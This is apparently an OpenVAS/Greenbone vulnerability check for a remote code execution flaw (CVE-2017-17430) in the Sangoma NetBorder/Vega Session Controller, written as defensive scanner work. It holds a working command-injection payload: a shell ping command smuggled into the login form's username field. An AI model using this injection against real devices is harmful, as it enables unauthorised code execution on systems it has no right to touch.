if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.112184" );
	script_version( "2021-06-25T02:00:34+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-06-25 02:00:34 +0000 (Fri, 25 Jun 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)" );
	script_tag( name: "creation_date", value: "2018-01-11 12:32:00 +0100 (Thu, 11 Jan 2018)" );
	script_cve_id( "CVE-2017-17430" );
	script_name( "Sangoma NetBorder/Vega Session Controller Remote Code Execution Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_dependencies( "gb_sangoma_nsc_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "sangoma/nsc/detected" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2018/Jan/36" );
	script_tag( name: "impact", value: "Successfully exploiting this issue may allow an attacker to execute arbitrary
  code in the context of the affected application." );
	script_tag( name: "vuldetect", value: "Try to execute a command by sending a special crafted HTTP GET request." );
	script_tag( name: "solution", value: "Upgrade to version 2.3.12-80-GA or later." );
	script_tag( name: "summary", value: "Sangoma NetBorder/Vega Session Controller is prone to a remote code-execution
  vulnerability." );
	script_tag( name: "affected", value: "Sangoma NetBorder/Vega Session Controller before version 2.3.12-80-GA." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
CPE = "cpe:/o:sangoma:netborder%2fvega_session_firmware";
require("http_func.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( port: port, cpe: CPE )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
vtstrings = get_vt_strings();
check = vtstrings["ping_string"];
pattern = hexstr( check );
pingcmd = "ping -c 3 -p " + pattern + " " + this_host();
post_data = "------WebKitFormBoundary7rCkcn7Zm8a4V1bH\r\nContent-Disposition: form-data; name=\"reserved_username\"\r\n\r\na; " + pingcmd + ";\r\n" + "------WebKitFormBoundary7rCkcn7Zm8a4V1bH\r\nContent-Disposition: form-data; name=\"reserved_password\"\r\n\r\nabc\r\n" + "------WebKitFormBoundary7rCkcn7Zm8a4V1bH\r\nContent-Disposition: form-data; name=\"Login\"\r\n\r\nLogin\r\n" + "------WebKitFormBoundary7rCkcn7Zm8a4V1bH--\r\n";
headers = make_array( "Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary7rCkcn7Zm8a4V1bH" );
req = http_post_put_req( port: port, url: "/", data: post_data, add_headers: headers );
res = send_capture( socket: soc, data: req, pcap_filter: NASLString( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );
close( soc );
if(!res){
	exit( 0 );
}
data = get_icmp_element( icmp: res, element: "data" );
if(data && ContainsString( data, check )){
	report = "It was possible to execute the command \"" + pingcmd + "\" on the remote host.\r\n\r\nRequest:\r\n\r\n" + req + "\r\n\r\nResponse:\r\n\r\n" + data;
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

